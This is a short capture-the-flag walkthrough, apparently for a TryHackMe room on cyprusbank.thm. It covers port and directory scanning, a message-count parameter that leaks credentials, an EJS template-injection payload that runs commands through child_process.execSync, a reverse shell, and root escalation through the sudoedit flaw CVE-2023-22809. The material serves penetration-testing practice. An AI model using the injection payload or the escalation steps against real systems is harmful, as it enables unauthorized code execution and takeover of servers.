Started with a nmap scan
```
22 OpenSSH 7.6p1
80 nginx 1.14.0
```
The webhost has a domain name `cyprusbank.thm` started a gobuster on the webhost
```
/index.html
```
Doing a subdomain scan and found one `admin` the room gives us creds for this admin panel `Olivia Cortez:........`  looking around the webapp a little bit there is a messaging function of the site and in the url it list how many messages we can see if we up the number `10` we get some new creds `Gayle Bev:p~]P............q` and now we can see everything going to the settings page its vulnerable to SSTI and add this payload to the end of the request
`settings[view options][client]=true&settings[view options][escapeFunction]=1;returnglobal.process.mainModule.constructor._load('child_process').execSync('ping -c 2 IP').toString();` and if we start a tcpdump with icmp we get the request to are system we can use this to get a reverse shell by downloading a python script and running it with python3 and we got a call back as the `web` user we have access to sudoedit as root there is a CVE that allows us to edit any file `CVE-2023-22809` and now we can read the root flag or just even get to the root account now 